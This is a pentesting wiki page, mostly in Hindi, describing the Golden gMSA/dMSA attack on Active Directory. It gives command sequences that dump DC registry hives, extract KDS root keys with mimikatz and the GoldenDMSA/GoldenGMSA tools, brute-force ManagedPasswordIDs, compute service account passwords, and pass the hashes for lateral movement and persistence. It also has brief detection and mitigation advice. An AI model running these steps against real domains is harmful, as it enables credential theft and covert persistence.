# Golden gMSA/dMSA Attack (Managed Service Account Passwords का ऑफ़लाइन व्युत्पत्ति)

{{#include ../../banners/hacktricks-training.md}}

## अवलोकन

Windows Managed Service Accounts (MSA) विशेष प्रिंसिपल होते हैं जो सेवाओं को बिना पासवर्ड को मैन्युअल रूप से प्रबंधित किए चलाने के लिए डिज़ाइन किए गए हैं। 
इसके दो प्रमुख प्रकार हैं:

1. **gMSA** – समूह Managed Service Account – इसे उन कई होस्ट पर उपयोग किया जा सकता है जो इसके `msDS-GroupMSAMembership` विशेषता में अधिकृत हैं।
2. **dMSA** – प्रतिनिधि Managed Service Account – gMSA का (पूर्वावलोकन) उत्तराधिकारी, जो समान क्रिप्टोग्राफी पर निर्भर करता है लेकिन अधिक बारीक प्रतिनिधित्व परिदृश्यों की अनुमति देता है।

दोनों प्रकारों के लिए **पासवर्ड को** प्रत्येक डोमेन कंट्रोलर (DC) पर सामान्य NT-हैश की तरह **स्टोर नहीं किया जाता**। इसके बजाय, प्रत्येक DC **वर्तमान पासवर्ड को** निम्नलिखित से ऑन-द-फ्लाई **व्युत्पन्न** कर सकता है:

* वन-वन **KDS रूट कुंजी** (`KRBTGT\KDS`) – यादृच्छिक रूप से उत्पन्न GUID-नामित रहस्य, जो `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` कंटेनर के तहत प्रत्येक DC पर पुनः उत्पन्न होता है।
* लक्षित खाता **SID**।
* एक प्रति-खाता **ManagedPasswordID** (GUID) जो `msDS-ManagedPasswordId` विशेषता में पाया जाता है।

व्युत्पत्ति है: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 बाइट का ब्लॉब अंततः **base64-encoded** होता है और `msDS-ManagedPassword` विशेषता में स्टोर किया जाता है। सामान्य पासवर्ड उपयोग के दौरान कोई Kerberos ट्रैफ़िक या डोमेन इंटरैक्शन की आवश्यकता नहीं होती – एक सदस्य होस्ट पासवर्ड को स्थानीय रूप से व्युत्पन्न करता है जब तक कि उसे तीन इनपुट का ज्ञान हो।

## Golden gMSA / Golden dMSA Attack

यदि एक हमलावर सभी तीन इनपुट **ऑफ़लाइन** प्राप्त कर सकता है, तो वे **किसी भी gMSA/dMSA के लिए** **मान्य वर्तमान और भविष्य के पासवर्ड** की गणना कर सकते हैं बिना फिर से DC को छुए, जिससे:

* LDAP पढ़ने का ऑडिटिंग
* पासवर्ड परिवर्तन अंतराल (वे पूर्व-गणना कर सकते हैं)

यह सेवा खातों के लिए *Golden Ticket* के समान है।

### पूर्वापेक्षाएँ

1. **एक DC** (या एंटरप्राइज एडमिन) का **वन-वन स्तर का समझौता**, या वन-वन में DCs में से एक पर `SYSTEM` पहुंच।
2. सेवा खातों को सूचीबद्ध करने की क्षमता (LDAP पढ़ें / RID ब्रूट-फोर्स)।
3. [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) या समकक्ष कोड चलाने के लिए .NET ≥ 4.7.2 x64 वर्कस्टेशन।

### Golden gMSA / dMSA
##### चरण 1 – KDS रूट कुंजी निकालें

किसी भी DC से डंप (वॉल्यूम शैडो कॉपी / कच्चे SAM+SECURITY हाइव या दूरस्थ रहस्य):
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
`RootKey` (GUID नाम) के रूप में लेबल किया गया base64 स्ट्रिंग बाद के चरणों में आवश्यक है।

##### चरण 2 – gMSA / dMSA ऑब्जेक्ट्स की गणना करें

कम से कम `sAMAccountName`, `objectSid` और `msDS-ManagedPasswordId` प्राप्त करें:
```powershell
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) सहायक मोड लागू करता है:
```powershell
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Phase 3 – ManagedPasswordID का अनुमान लगाना / पता लगाना (जब गायब हो)

कुछ डिप्लॉयमेंट्स `msDS-ManagedPasswordId` को ACL-संरक्षित पढ़ाई से *हटा* देते हैं।  
क्योंकि GUID 128-बिट है, साधारण ब्रूटफोर्स असंभव है, लेकिन:

1. पहले **32 बिट = Unix युग समय** खाता निर्माण का (मिनटों का संकल्प)।
2. इसके बाद 96 यादृच्छिक बिट्स।

इसलिए **प्रत्येक खाते के लिए संकीर्ण शब्द सूची** (± कुछ घंटे) यथार्थवादी है।
```powershell
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
यह उपकरण उम्मीदवार पासवर्ड की गणना करता है और उनके base64 blob की तुलना वास्तविक `msDS-ManagedPassword` विशेषता से करता है - मिलान सही GUID को प्रकट करता है।

##### चरण 4 – ऑफ़लाइन पासवर्ड गणना और रूपांतरण

एक बार जब ManagedPasswordID ज्ञात हो जाता है, तो मान्य पासवर्ड एक कमांड की दूरी पर है:
```powershell
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
The resulting hashes can be injected with **mimikatz** (`sekurlsa::pth`) or **Rubeus** for Kerberos abuse, enabling stealth **lateral movement** and **persistence**.

## Detection & Mitigation

* Tier-0 प्रशासकों के लिए **DC बैकअप और रजिस्ट्री हाइव पढ़ने** की क्षमताओं को सीमित करें।
* DCs पर **Directory Services Restore Mode (DSRM)** या **Volume Shadow Copy** निर्माण की निगरानी करें।
* सेवा खातों के `CN=Master Root Keys,…` और `userAccountControl` ध्वजों के पढ़ने / परिवर्तनों का ऑडिट करें।
* असामान्य **base64 पासवर्ड लेखन** या होस्टों के बीच अचानक सेवा पासवर्ड पुन: उपयोग का पता लगाएं।
* जहां Tier-0 अलगाव संभव नहीं है, उच्च-विशेषाधिकार gMSAs को नियमित यादृच्छिक घुमाव के साथ **क्लासिक सेवा खातों** में परिवर्तित करने पर विचार करें।

## Tooling

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – इस पृष्ठ में उपयोग की गई संदर्भ कार्यान्वयन।
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – इस पृष्ठ में उपयोग की गई संदर्भ कार्यान्वयन।
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`।
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – व्युत्पन्न AES कुंजियों का उपयोग करके पास-दी-टिकट।

## References

- [Golden dMSA – authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)
- [Improsec – Golden gMSA trust attack](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

{{#include ../../banners/hacktricks-training.md}}
